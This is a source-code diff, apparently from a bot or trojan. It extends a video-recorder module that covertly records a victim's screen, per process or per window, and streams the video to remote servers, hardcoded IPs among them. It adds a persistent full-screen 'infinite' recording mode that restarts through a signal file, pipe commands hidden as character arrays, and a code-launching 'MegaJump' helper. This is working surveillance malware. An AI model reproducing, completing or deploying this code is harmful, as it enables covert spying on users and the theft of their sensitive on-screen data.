@@ -40,8 +40,10 @@ namespace VIDEORECDEBUGSTRINGS
 
 
 #ifdef DEBUGCONFIG
-	char VIDEO_REC_HOST1[] = "178.162.179.65"; 
-	char VIDEO_REC_HOST2[] = "188.72.202.163";
+//	char VIDEO_REC_HOST1[] = "178.162.179.65";
+//	char VIDEO_REC_HOST2[] = "188.72.202.163";
+	char VIDEO_REC_HOST1[] = "127.0.0.1";
+	char VIDEO_REC_HOST2[] = "127.0.0.1";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
@@ -120,8 +122,8 @@ TVideoRecorder::TVideoRecorder()
 	UID        = Bot->UID();
 	Server     = VIDEO_REC_HOST1;
 	Server2    = VIDEO_REC_HOST2;
-	Port       =  VIDEORECORD_DEFAULT_PORT;
-	Port2      =  VIDEORECORD_DEFAULT_PORT;
+	Port       = VIDEORECORD_DEFAULT_PORT;
+	Port2      = VIDEORECORD_DEFAULT_PORT;
     RecordTime = 0;
 }
 //--------------------------------------------------------------
@@ -132,8 +134,9 @@ TVideoRecorder::~TVideoRecorder()
 }
 //--------------------------------------------------------------
 
-void TVideoRecorder::ReccordProcess(DWORD PID)
+void TVideoRecorder::RecordProcess(DWORD PID)
 {
+	// Функция запускает запись видео с указанного процесса
 	if (FDLL.RecordProcess)
 	{
 		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
@@ -143,11 +146,29 @@ void TVideoRecorder::ReccordProcess(DWORD PID)
 }
 //--------------------------------------------------------------
 
-void TVideoRecorder::ReccordCurrentProcess()
+void TVideoRecorder::RecordCurrentProcess()
 {
-	ReccordProcess(Bot->PID());
+	// функция запускает запись видео с текущего процесса
+	RecordProcess(Bot->PID());
 }
 //--------------------------------------------------------------
+
+void TVideoRecorder::RecordWnd(HWND Wnd)
+{
+	// Функция запускает запись видео с указанного окна
+	if (FDLL.RecordWnd)
+	{
+		int Flags = 0;
+		if (!Wnd)
+		{
+			// Запускается полноэкранная запись
+			Flags = VIDEO_FULLSCREEN | VIDEO_ALWAYS;
+        }
+		FDLL.RecordWnd(UID.t_str(), VideoName.t_str(), Wnd,
+					   Server.t_str(), Port,
+					   Server2.t_str(), Port2, RecordTime, Flags);
+    }
+}
 
 
 
@@ -447,9 +468,12 @@ namespace VideoRecorderSrv
 	char ServerName[] = {'v','i','d','e','o','r','e','c','s','r','v', 0};
 
 	char CommandStart[] = {'s','t','a','r','t','v','r', 0};
+	char CommandStartInfinite[] = {'s','t','a','r','t','v','r', 'i', 'n', 'f', 0};
 	char CommandStop[]  = {'s','t','o','p','v','r', 0};
 
 	char ClientPipe[] = {'V','d','e','o','R','e','c','C','l','i','e','n','t', 0};
+
+    char InfiniteRecorderPipe[] = "infvdrec";
 
 	//----------------------------------------------------------------------
 	// Глобальные данные
@@ -531,17 +555,6 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------------------
 
-  /*	void WINAPI ClientStartHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
-	{
-    	// Обработчик команды остановки видео
-		if (ClientThread == NULL)
-		{
-			PCHAR URL = STR::New((PCHAR)Pipe->Data);
-			ClientThread = StartThread(RecordThread, URL);
-        }
-	}    */
-	//----------------------------------------------------------------------
-
 	void WINAPI ClientStopHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
 	{
     	// Обработчик команды остановки видео
@@ -553,7 +566,7 @@ namespace VideoRecorderSrv
 	DWORD WINAPI ClientMainProc(LPVOID Data)
 	{
 		// Основная процедура клиента записи видео
-		InitializeAPI();
+		BOT::Initialize();
 
 		VDRDBG("VideoRecorder", "Запущен клиент записи видео. PID %d", ClientPID);
 
@@ -593,17 +606,22 @@ namespace VideoRecorderSrv
 	}
 	//----------------------------------------------------------------------
 
+	void SetClientParams(PPipeMessage Msg)
+	{
+		// Функция инициализирует глобальне данные клиента
+		ClientPID = Msg->PID;
+		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
+		DWORD CopySize = Min(ClientURLMaxSize, Msg->DataSize);
+		m_memcpy(ClientURL, Msg->Data, CopySize);
+    }
+
+    //----------------------------------------------------------------------
 
 	void WINAPI ServerStartHandler(LPVOID, PPipeMessage Msg, bool &Cancel)
 	{
 		// Обработчик команды запуска видео
 
 		// Настраиваем параметры старта
-		ClientPID = Msg->PID;
-		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
-		DWORD CopySize = Min(ClientURLMaxSize, Msg->DataSize);
-        m_memcpy(ClientURL, Msg->Data,CopySize);
-
 
         VDRDBG("VideoRecServer", "Получена команда записи видео с процесса %d", ClientPID);
 
@@ -615,6 +633,8 @@ namespace VideoRecorderSrv
 		// В случае если процесс не работает запускаем его
 		if (!Running)
 		{
+			SetClientParams(Msg);
+
 //			 StartThread(ClientMainProc, NULL);
 			MegaJump(ClientMainProc);
 
@@ -632,8 +652,68 @@ namespace VideoRecorderSrv
 
 		STR::Free(PipeName);
 	}
-	//-----------------------------------------------------------------------
+	//----------------------------------------------------------
 
+
+
+	DWORD WINAPI InfiniteRecordingProc(LPVOID)
+	{
+		// Функция бесконечной записи видео
+		BOT::Initialize();
+
+        VDRDBG("VideoRecorder", "Запускаем полноэкранную бесконечную запись видео");
+
+
+		PIPE::CreateProcessPipe(InfiniteRecorderPipe, true);
+
+		TVideoRecorder Recorder;
+
+		Recorder.VideoName = "fullscreen";
+
+		Recorder.RecordWnd(0);
+
+		// Входим в весный цикл ожидания
+		while (1) pSleep(INFINITE);
+
+		return 0;
+    }
+    //----------------------------------------------------------
+
+	string GetInfiniteRecordFile()
+	{
+		// Функция возвращает имя сигнального файла бесконечной записи
+		string Name = Bot->WorkPath() + "infvrc.dat";
+		return Name;
+	}
+	//----------------------------------------------------------
+
+	bool IsInfiniteRecording()
+	{
+		// функция озвращает истину если в системе присутствует сигнальный
+		// файл бесконечной записи
+		return FileExistsA(GetInfiniteRecordFile().t_str());
+	}
+	//----------------------------------------------------------
+
+	void StartInfiniteRecord()
+	{
+		// Функция запускает бесконечную запись видео всего экрана
+
+		// Создаём сигнальный файл
+		string FileName = GetInfiniteRecordFile();
+		File::WriteBufferA(FileName.t_str(), NULL, 0);
+
+		// запускаем запись
+		if (!PIPE::Ping(InfiniteRecorderPipe))
+			MegaJump(InfiniteRecordingProc);
+	}
+	//----------------------------------------------------------
+
+	void WINAPI ServerStartInfiniteHandler(LPVOID, PPipeMessage, bool&)
+	{
+		//  обработчик команды бесконечной записи видео
+		StartInfiniteRecord();
+	}
 }
 //-----------------------------------------------------------------------------
 
@@ -645,8 +725,15 @@ bool VideoRecorderSrv::Start()
 	if (Pipe == NULL)
 		return false;
 
+	// При необходимости запускаем бесконечную запись
+	if (IsInfiniteRecording())
+	{
+		StartInfiniteRecord();
+	}
+
 	// Добавляем обработчики команд
 	PIPE::RegisterMessageHandler(Pipe, ServerStartHandler, NULL, CommandStart, 0);
+	PIPE::RegisterMessageHandler(Pipe, ServerStartInfiniteHandler, NULL, CommandStartInfinite, 0);
 
 	return true;
 }
@@ -668,8 +755,27 @@ bool VideoRecorderSrv::StartRecording(PCHAR URL)
 
 	if (!Result)
 	{
-    	VDRDBG("VideoRecorder", "Ошибка запуска удалённой записи. Возможно сервер не доступен.");
-    }
+		VDRDBG("VideoRecorder", "Ошибка запуска удалённой записи. Возможно сервер не доступен.");
+	}
+
+	return Result;
+}
+//-----------------------------------------------------------------------------
+
+//-----------------------------------------------------
+//  StartInfiniteRecording - Функция запускает
+//  бесконечную запись в полноэкранном режиме
+//-----------------------------------------------------
+bool VideoRecorderSrv::StartInfiniteRecording(const char* VideoName)
+{
+	VDRDBG("VideoRecorder", "Отправляем команду бесконечной записи видео");
+
+	bool Result = PIPE::SendMessage(ServerName, CommandStartInfinite, (PCHAR)VideoName, 0, NULL);
+
+	if (!Result)
+	{
+		VDRDBG("VideoRecorder", "Ошибка запуска удалённой записи. Возможно сервер не доступен.");
+	}
 
 	return Result;
 }
